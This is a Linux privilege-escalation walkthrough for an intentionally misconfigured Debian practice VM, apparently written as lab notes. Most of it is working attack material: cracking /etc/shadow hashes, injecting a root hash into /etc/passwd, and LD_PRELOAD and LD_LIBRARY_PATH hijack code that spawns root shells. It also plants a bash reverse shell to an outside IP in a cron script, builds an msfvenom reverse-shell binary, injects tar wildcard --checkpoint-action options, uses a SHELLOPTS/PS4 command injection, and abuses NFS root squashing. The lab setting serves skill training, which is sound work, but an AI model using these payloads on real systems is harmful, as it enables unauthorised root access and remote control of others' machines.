# Linux PrivEsc

## Practice your Linux Privilege Escalation skills on an intentionally misconfigured Debian VM with multiple ways to get root!

1. Typical configuration of /etc/shadow file:
```
$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1395 Nov 17 19:58 /etc/shadow                            
```


/etc/shadow file is readable
```
user@debian:/tmp$ cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
mysql:!:18133:0:99999:7:::
```
```
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt /tmp/hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)     
1g 0:00:00:01 DONE (2022-11-21 12:48) 0.6944g/s 1066p/s 1066c/s 1066C/s cuties..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

2. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.

Generate a password hash and write it inside the /etc/passwd root entry:

```
└─$ openssl passwd bellapassword    
$1$GYnznsrb$1nh6QXRI8/xUzuHzWyjUT/
```

![image](https://user-images.githubusercontent.com/62257411/203126354-55067afa-4747-48c0-8478-90fdf6c1fe4b.png)

3. Environmental variables of sudo
LD_PRELOAD
```
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more

```
Compile this C code
```
user@debian:~$ cat /home/user/tools/sudo/preload.c
```
```c
user@debian:~$ cat /home/user/tools/sudo/preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0); #i want to run the next program as root
        system("/bin/bash -p");
}

```
![image](https://user-images.githubusercontent.com/62257411/203281901-2ee620e3-6340-4fcf-8fd8-25060264e1fc.png)

LD_LIBRARY_PATH
```
user@debian:~$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007fff1f5ff000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f328420f000)
        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f3283feb000)
        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f3283db1000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007f3283b95000)
        libc.so.6 => /lib/libc.so.6 (0x00007f3283829000)
        libuuid.so.1 => /lib/libuuid.so.1 (0x00007f3283624000)
        librt.so.1 => /lib/librt.so.1 (0x00007f328341c000)
        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f32831e5000)
        libdl.so.2 => /lib/libdl.so.2 (0x00007f3282fe0000)
        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f3282db8000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f32846cc000)

```
Compile this C code
```
user@debian:~$ cat /home/user/tools/sudo/library_path.c

```
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
![image](https://user-images.githubusercontent.com/62257411/203288830-6c1c2411-c258-481c-bcba-187429c74547.png)

4. Cron job
```
user@debian:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh #run every minute
* * * * * root /usr/local/bin/compress.sh ##run every minute
```

Add to overwrite.sh the following reverse shell:
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

5. Cron Job - PATH environment variable
```
user@debian:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # <------- EXPLOIT THIS CONFIGURATION ERROR

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh # ---> IT ISN'T SPECIFIED THE COMPLETE PATH TO BINARY !!!!
* * * * * root /usr/local/bin/compress.sh ##run every minute
```
Create a file in /home/user/overwrite.sh
![image](https://user-images.githubusercontent.com/62257411/203292503-cd592735-73be-4176-948c-35ae5c518777.png)

Make sure that the file is executable:
```bash
chmod +x /home/user/overwrite.sh
```
6.Cron Jobs - Wildcards 
```bash
user@debian:~$ cat /usr/local/bin/compress.sh 
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

Generate a reverse shell elf binary and copy it under **/home/user**

```bash
┌──(kali㉿kali)-[~]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.9.19.80 LPORT=4242 -f elf -o shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: shell.elf

```

If we create 2 files under /home/user with these names:
```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```
![image](https://user-images.githubusercontent.com/62257411/203304264-03475dd1-8606-4734-a0de-d421a24d1d5a.png)



When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid 
tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

```bash
tar czf /tmp/backup.tar.gz *
```

will be expanded as here:
```bash
tar czf /tmp/backup.tar.gz --checkpoint=1 <<<<<<< treat it as command line options rather than filenames!!!
tar czf /tmp/backup.tar.gz --checkpoint-action=exec=shell.elf <<<<<<< treat it as command line options rather than filenames!!!
tar czf /tmp/backup.tar.gz myvpn.ovpn
tar czf /tmp/backup.tar.gz tools
```
and thanks to misconfiguration of PATH variable in /etc/crontab
![image](https://user-images.githubusercontent.com/62257411/203304810-8696d96f-8bbc-4b46-b9b6-d9ed4354923a.png)

we can obtain a reverse shell!

7. Find all the SUID/SGID executables on the VM:

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

use ```strace``` to analyze binary with SUID/SGID:

```
user@debian:~$ strace /usr/local/bin/suid-so
execve("/usr/local/bin/suid-so", ["/usr/local/bin/suid-so"], [/* 18 vars */]) = 0
brk(0)                                  = 0x1c99000
fcntl(0, F_GETFD)                       = 0
fcntl(1, F_GETFD)                       = 0
fcntl(2, F_GETFD)                       = 0
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fb54d7e2000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=13718, ...}) = 0
mmap(NULL, 13718, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fb54d7de000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\340\r\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=14696, ...}) = 0
mmap(NULL, 2109696, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fb54d3c3000
mprotect(0x7fb54d3c5000, 2097152, PROT_NONE) = 0
mmap(0x7fb54d5c5000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7fb54d5c5000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\243\5\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=1043976, ...}) = 0
mmap(NULL, 3223576, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fb54d0af000
mprotect(0x7fb54d1a5000, 2097152, PROT_NONE) = 0
mmap(0x7fb54d3a5000, 36864, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xf6000) = 0x7fb54d3a5000
mmap(0x7fb54d3ae000, 81944, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fb54d3ae000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0`>\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=526624, ...}) = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fb54d7dd000
mmap(NULL, 2621656, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fb54ce2e000
mprotect(0x7fb54ceae000, 2093056, PROT_NONE) = 0
mmap(0x7fb54d0ad000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x7f000) = 0x7fb54d0ad000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P-\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=90504, ...}) = 0
mmap(NULL, 2186232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fb54cc18000
mprotect(0x7fb54cc2e000, 2093056, PROT_NONE) = 0
mmap(0x7fb54ce2d000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x15000) = 0x7fb54ce2d000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0@\356\1\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=1478056, ...}) = 0
mmap(NULL, 3586120, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fb54c8ac000
mprotect(0x7fb54ca0e000, 2097152, PROT_NONE) = 0
mmap(0x7fb54cc0e000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x162000) = 0x7fb54cc0e000
mmap(0x7fb54cc13000, 18504, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fb54cc13000
close(3)                                = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fb54d7dc000
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fb54d7da000
arch_prctl(ARCH_SET_FS, 0x7fb54d7da720) = 0
mprotect(0x7fb54cc0e000, 16384, PROT_READ) = 0
mprotect(0x7fb54d0ad000, 4096, PROT_READ) = 0
mprotect(0x7fb54d3a5000, 28672, PROT_READ) = 0
mprotect(0x7fb54d5c5000, 4096, PROT_READ) = 0
mprotect(0x7fb54d7e4000, 4096, PROT_READ) = 0
munmap(0x7fb54d7de000, 13718)           = 0
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fb54d7e1000
write(1, "Calculating something, please wa"..., 38Calculating something, please wait...
) = 38
brk(0)                                  = 0x1c99000
brk(0x1cba000)                          = 0x1cba000
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)  <<<<<<<<<<<< !!! Shared Object Injection !!!
```
8. SUID / SGID Executables - Environment Variables 

The full path of service is not used:
![image](https://user-images.githubusercontent.com/62257411/203371729-c7892c41-234d-4108-8cfa-fc9c73861669.png)

Compile a custom "fake" service (will spawn the shell) and add current working directory to the PATH env variable:
![image](https://user-images.githubusercontent.com/62257411/203372370-40d94b71-dd64-4c38-85eb-d76f7d5c6893.png)

9. Abuse shell

[!] This will not work on Bash versions 4.4 and above:

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' <program-with-suid-or-sgid-enabled>
    
10. Show history files 
```
cat ~/.*history | less
```

11. NFS and root squash
Root squash basically remaps the root UID from 0 to an anonymous user with no privileges (usually mouser:no group). This means that root is stripped of all privileges and is not able to read any files which are not world read, or write to any paths that are restricted. 
On vulnerable server:
```
cat /etc/exports
```
if there is some NSF share with root squashing disabled we can exploit it...

Mount on the local attacking machine the NFS (customize IP of NFS server):
![image](https://user-images.githubusercontent.com/62257411/203384808-f9e92565-282f-4104-814c-321e81821780.png)

From attacking machine upload to NFS the payload with SUID bit and exec it.
 
    
    
